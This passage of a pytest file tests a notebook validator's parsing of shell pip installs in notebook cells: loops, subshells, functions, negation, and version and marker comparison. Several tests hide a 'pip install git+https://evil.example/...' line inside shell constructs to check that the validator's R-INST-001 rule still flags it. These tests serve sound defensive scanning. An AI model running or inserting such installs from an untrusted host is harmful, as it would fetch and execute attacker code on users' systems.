    for spelling in ("huggingface.hub", "huggingface_hub", "Huggingface--Hub"):
        assert "huggingface-hub" not in nv.resolved_set(f"!pip uninstall -y {spelling}", colab)
        assert nv._removed_by_cell(f"!pip uninstall -y {spelling}", "huggingface-hub") is True


def test_a_for_list_is_read_across_any_shell_whitespace():
    """`for x\tin\ta` is the same loop to bash as the spaced form.

    Partitioning on the literal `" in "` found no list, so a body that certainly runs was marked
    conditional and its install dropped out of the replay."""
    nv = _load_notebook_validator_module()

    assert ("!pip install torch==2.11", False) in nv._split_chained(
        "!for x\tin\ta; do pip install torch==2.11; done"
    )
    # A list that may expand to nothing still leaves the body conditional.
    assert ("!pip install torch==2.11", True) in nv._split_chained(
        "!for x\tin\t$LIST; do pip install torch==2.11; done"
    )


def test_a_group_behind_a_keyword_is_still_unwrapped():
    """`if (pip install ...); then` exposes the `(` only once `if` comes off.

    Leaving the bracket in front of the command hid it from PIP_LINE_RE, so a prohibited source in
    a branch bash reaches went unreported by R-INST-001."""
    nv = _load_notebook_validator_module()

    cell = "!if (pip install git+https://evil.example/x.git); then :; fi"
    # The test of an `if` runs whenever the line does, so it is not conditional.
    assert ("!pip install git+https://evil.example/x.git", False) in nv._split_chained(cell)
    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
        ["git+https://evil.example/x.git"]
    ]
    # A brace group behind a body keyword too, and IPython's `{sys.executable}` still is not one.
    assert ("!pip install a", True) in nv._split_chained("!if maybe; then { pip install a; }; fi")


def test_a_closed_subshell_keeps_the_failure_it_folded():
    """`(false && true)` exits 1, so bash never reaches the `&&` behind it.

    The close had already folded the group's status, and re-reading the text in hand picked up its
    last lexical `true` and replayed an install that cannot run."""
    nv = _load_notebook_validator_module()

    assert ("!pip install torch==2.11.0", True) in nv._split_chained(
        "!(false && true) && pip install torch==2.11.0"
    )
    # A group that really succeeds still carries its tail.
    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
        "!(false || true) && pip install torch==2.11.0"
    )
    # And a known failure still reaches the `||` fallback.
    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
        "!(false && true) || pip install torch==2.11.0"
    )


def test_break_and_continue_take_the_level_they_name():
    """`break 2` leaves the enclosing loop as well, so the outer body stops too.

    Binding every jump to the innermost loop let the outer loop's remaining commands replay as
    reached, and a pin bash never installs raised a compatibility finding."""
    nv = _load_notebook_validator_module()

    outer = "!for x in a; do for y in b; do %s; done; pip install torch==2.11; done"
    assert ("!pip install torch==2.11", False) in nv._split_chained(outer % "break")
    for jump in ("break 2", "continue 2", "break 9"):
        assert "!pip install torch==2.11" not in [
            text for text, _ in nv._split_chained(outer % jump)
        ], jump


def test_a_substitution_reaches_a_function_its_parent_defined():
    """A command substitution runs with the functions the parent shell already has.

    The recursive parse cannot see the definition, so an uncalled-looking body was dropped while
    bash ran the install inside it."""
    nv = _load_notebook_validator_module()

    cell = "!f(){ pip install git+https://evil.example/x.git; }; echo $(f)"
    assert ("!pip install git+https://evil.example/x.git", False) in nv._split_chained(cell)
    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
        ["git+https://evil.example/x.git"]
    ]
    # A substitution the notebook may not expand leaves the body conditional.
    assert ("!pip install a", True) in nv._split_chained(
        "!f(){ pip install a; }; echo ${READY:-$(f)}"
    )


def test_a_condition_that_fails_whatever_pip_does_stays_known():
    """`if false && pip install x` is known to fail, so its `else` certainly runs.

    Marking the condition assumed merely because pip appears in it turned that certainty into a
    guess, and the install bash always performs dropped out of the replay."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!if false && pip install x; then :; else pip install torchcodec==0.11; fi",
        "!if pip install x && false; then :; else pip install torchcodec==0.11; fi",
    ):
        assert ("!pip install torchcodec==0.11", False) in nv._split_chained(cell), cell
    # The assumption still counts where it really decides the condition: this body runs
    # exactly when the install fails, and R-INST-001 has to see the source in it.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!if ! pip install x; then pip install git+https://evil.example/x.git; fi",
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-001"]


def test_a_path_qualified_prefix_runs_the_same_program():
    """`/usr/bin/env pip install ...` installs exactly as the bare `env` form does.

    Stopping at the path left the invocation invisible to every install rule, R-INST-001 included."""
    nv = _load_notebook_validator_module()

    cell = "!pip install requests; /usr/bin/env pip install git+https://evil.example/repo.git"
    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
        ["requests"],
        ["git+https://evil.example/repo.git"],
    ]
    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
    # Still not a function call, since a path names a file rather than a shell function.
    assert nv._split_chained("!f(){ pip install a; }; /usr/bin/env f") == [("!f", False)]


def test_a_literal_return_status_propagates_out_of_a_function():
    """`help return`: `return N` exits the function with N.

    Reading it as unknown left `setup() { return 0; }; setup && pip install ...` conditional and
    dropped an install that always runs."""
    nv = _load_notebook_validator_module()

    assert ("!pip install torch==2.11", False) in nv._split_chained(
        "!setup() { return 0; }; setup && pip install torch==2.11"
    )
    assert ("!pip install torch==2.11", True) in nv._split_chained(
        "!setup() { return 1; }; setup && pip install torch==2.11"
    )
    # A bare `return` carries the previous command's status, which nothing here names.
    assert ("!pip install torch==2.11", True) in nv._split_chained(
        "!setup() { maybe; return; }; setup && pip install torch==2.11"
    )


def test_a_prerelease_sorts_below_the_release_it_leads_up_to():
    """PEP 440 puts `0.12.0rc1` under `0.12.0`, and `dev` under `a` under `b` under `rc`.

    Reading the suffix's digits as another release component sorted the candidate ABOVE its own
    release, so a floor the cell upgrades past looked already met."""
    nv = _load_notebook_validator_module()

    assert nv.cmp_versions("0.12.0rc1", "0.12.0") == -1
    assert nv.cmp_versions("0.12.0rc1", "0.11.9") == 1
    assert nv.cmp_versions("0.12.0rc1", "0.12.0rc2") == -1
    assert nv.cmp_versions("0.12.0.dev1", "0.12.0a1") == -1
    assert nv.cmp_versions("0.12.0a1", "0.12.0b1") == -1
    # Release cores still compare as before, local versions and zero padding included.
    assert nv.cmp_versions("0.11", "0.11.0") == 0
    assert nv.cmp_versions("2.11.0+cu128", "2.11.0") == 0
    # So a floor the release candidate sits below moves it.
    assert nv._effective_version(
        "!pip install torchcodec==0.12.0rc1\n!pip install 'torchcodec>=0.12.0'",
        "torchcodec",
        "0.11.0",
    ) == ("0.12.0", False)


def test_a_negation_covers_the_whole_pipeline():
    """Bash negates a pipeline's status, not its first command's.

    `! true | false` succeeds, so the `&&` behind it runs; losing the `!` at the pipe read every
    one of these backwards."""
    nv = _load_notebook_validator_module()

    runs = ("!! true | false && pip install a", "!true | true && pip install a")
    skips = (
        "!! true | true && pip install a",
        "!! ! true | false && pip install a",
        "!true | false && pip install a",
        "!! false | true && pip install a",
    )
    for cell in runs:
        assert ("!pip install a", False) in nv._split_chained(cell), cell
    for cell in skips:
        assert ("!pip install a", True) in nv._split_chained(cell), cell
    # The fallback side reads the same status: a pipeline that succeeds skips its `||`.
    assert ("!pip install a", True) in nv._split_chained("!! true | false || pip install a")


def test_a_definition_behind_a_body_keyword_is_still_read():
    """`then f(){ pip install ...; }` defines f, and the header has to come off.

    Matching the definition before the keyword left the header standing, so the body never reached
    PIP_LINE_RE and R-INST-001 saw no install where bash runs one."""
    nv = _load_notebook_validator_module()

    cell = "!if true; then f(){ pip install git+https://evil.example/x.git; }; fi; f"
    assert ("!pip install git+https://evil.example/x.git", False) in nv._split_chained(cell)
    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
    # Uncalled, the body is still unreachable rather than merely conditional.
    assert "!pip install git+https://evil.example/x.git" not in [
        text
        for text, _ in nv._split_chained(
            "!if true; then f(){ pip install git+https://evil.example/x.git; }; fi"
        )
    ]


def test_a_landing_pinned_to_an_excluded_release_names_nothing():
    """`<0.12,<=0.11,!=0.11.0` admits no 0.11 at all, since the cap pins it to 0.11.0.

    Handing back the ceiling-derived 0.11 fabricated a pairing R-INST-004 then accepted."""
    nv = _load_notebook_validator_module()

    assert nv._effective_version(
        '!pip install "torchcodec<0.12,<=0.11,!=0.11.0"', "torchcodec", "0.11.0"
    ) == (None, True)
    # Without the cap the rest of the 0.11 line is still open, so the landing stands.
    assert nv._effective_version(
        '!pip install "torchcodec>=0.11,<0.12,!=0.11.0"', "torchcodec", "0.11.0"
    ) == ("0.11", True)


def test_a_prerelease_landing_is_promoted_only_where_the_release_is_admitted():
    """`>=0.12.0a1,<0.12.0rc1` stops below every stable 0.12.

    Promoting the landing to `0.12.0` there cleared an ABI floor the installed codec is under, so
    R-INST-004 took the ABI-stable short circuit on a prerelease."""
    nv = _load_notebook_validator_module()

    assert nv._effective_version(
        '!pip install "torchcodec>=0.12.0a1,<0.12.0rc1"', "torchcodec", "0.11.0"
    ) == ("0.12.0a1", True)
    # A window that does admit the stable release still names it.
    assert nv._effective_version(
        '!pip install "torchcodec~=0.12.0rc1"', "torchcodec", "0.11.0"
    ) == ("0.12.0", True)


def test_a_marker_term_the_oracle_cannot_answer_is_only_one_term():
    """A decisive `false and unknown` is still false.

    Bailing out on any unavailable field replayed a pin pip certainly skips, and R-INST-004
    reported an incompatibility against a compatible baseline."""
    nv = _load_notebook_validator_module()

    environment = nv._marker_environment({"python": "3.13.15"})
    assert "implementation_name" not in environment  # the case this is about
    decided = "python_version < '3.0' and implementation_name == 'cpython'"
    assert nv._requirement_applies(f"torchcodec==0.10; {decided}", environment) is False
    # An unknown term that could still decide the marker stays conservative.
    for undecided in (
        "python_version >= '3.0' and implementation_name == 'cpython'",
        "python_version < '3.0' or implementation_name == 'cpython'",
        "implementation_name == 'cpython'",
    ):
        assert nv._requirement_applies(f"torchcodec==0.10; {undecided}", environment) is True
    # Parentheses and `and` binding tighter than `or` are both read.
    assert (
        nv._requirement_applies(
            "torchcodec==0.10; (python_version < '3.0' or python_version > '4')"
            " and sys_platform == 'linux'",
            environment,
        )
        is False
    )
    assert nv._requirement_applies("torchcodec==0.10; python_version >= '3.10'", environment)


def test_a_quoted_loop_word_is_one_literal_iteration():
    """`for x in '*'` iterates over a literal star, so its body certainly runs.

    Reading the raw word treated the quoted glob as possibly empty and dropped the install from the
    replay."""
    nv = _load_notebook_validator_module()

    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
        "!for x in '*'; do pip install torch==2.11.0; done"
    )
    # Unquoted, and inside double quotes where it still expands, it stays indeterminate.
    for cell in (
        "!for x in *; do pip install torch==2.11.0; done",
        '!for x in "$LIST"; do pip install torch==2.11.0; done',
        "!for x in $LIST; do pip install torch==2.11.0; done",
    ):
        assert ("!pip install torch==2.11.0", True) in nv._split_chained(cell), cell
    # A double-quoted glob is literal too: only `$` and a backquote survive those quotes.
    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
        '!for x in "*"; do pip install torch==2.11.0; done'
    )
